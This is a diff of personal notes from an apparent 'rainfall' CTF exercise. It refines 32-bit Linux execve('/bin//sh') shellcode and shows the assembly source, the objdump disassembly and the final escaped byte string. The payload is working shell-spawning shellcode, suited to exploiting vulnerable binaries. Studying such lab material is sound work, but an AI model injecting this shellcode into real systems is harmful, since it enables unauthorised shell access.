@@ -5,15 +5,17 @@ main:
 	db 0x90,0x90,0x90,0x90
 	xor edx, edx
 	xor ecx, ecx
-	xor eax, eax
-	mov al, 0xb ;execve syscall and last byte of stack string
-	push 0x0b68732f
+	push ecx
+	push 0x68732f2f
 	push 0x6e69622f
-	xor byte [esp+7], al
+	xor eax, eax
+	mov al, 11
 	mov ebx, esp
 	and esp, 0xfffffff0
 	int 0x80
 	db 0x90,0x90,0x90,0x90
+root@debian:/home/user/rainfall# 
+root@debian:/home/user/rainfall# 
 root@debian:/home/user/rainfall# objdump -d -M intel shell | grep '<main>' -A24
 00000560 <main>:
  560:	90                   	nop
@@ -22,19 +24,26 @@ root@debian:/home/user/rainfall# objdump -d -M intel shell | grep '<main>' -A24
  563:	90                   	nop
  564:	31 d2                	xor    edx,edx
  566:	31 c9                	xor    ecx,ecx
- 568:	31 c0                	xor    eax,eax
- 56a:	b0 0b                	mov    al,0xb
- 56c:	68 2f 73 68 0b       	push   0xb68732f
- 571:	68 2f 62 69 6e       	push   0x6e69622f
- 576:	30 44 24 07          	xor    BYTE PTR [esp+0x7],al
- 57a:	89 e3                	mov    ebx,esp
- 57c:	83 e4 f0             	and    esp,0xfffffff0
- 57f:	cd 80                	int    0x80
+ 568:	51                   	push   ecx
+ 569:	68 2f 2f 73 68       	push   0x68732f2f
+ 56e:	68 2f 62 69 6e       	push   0x6e69622f
+ 573:	31 c0                	xor    eax,eax
+ 575:	b0 0b                	mov    al,0xb
+ 577:	89 e3                	mov    ebx,esp
+ 579:	83 e4 f0             	and    esp,0xfffffff0
+ 57c:	cd 80                	int    0x80
+ 57e:	90                   	nop
+ 57f:	90                   	nop
+ 580:	90                   	nop
  581:	90                   	nop
- 582:	90                   	nop
- 583:	90                   	nop
- 584:	90                   	nop
+ 582:	66 90                	xchg   ax,ax
+ 584:	66 90                	xchg   ax,ax
+ 586:	66 90                	xchg   ax,ax
+ 588:	66 90                	xchg   ax,ax
+ 58a:	66 90                	xchg   ax,ax
+ 58c:	66 90                	xchg   ax,ax
+root@debian:/home/user/rainfall# 
 
+ 31 d2 31 c9 51 68 2f 2f 73 68 68 2f 62 69 6e 31 c0 b0 0b 89 e3 83 e4 f0 cd 80         
 
- 31 d2 31 c9 31 c0 b0 0b 68 2f 73 68 0b 68 2f 62 69 6e 30 44 24 07 89 e3 83 e4 f0 cd 80          
-\x31\xd2\x31\xc9\x31\xc0\xb0\x0b\x68\x2f\x73\x68\x0b\x68\x2f\x62\x69\x6e\x30\x44\x24\x07\x89\xe3\x83\xe4\xf0\xcd\x80
+\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80 
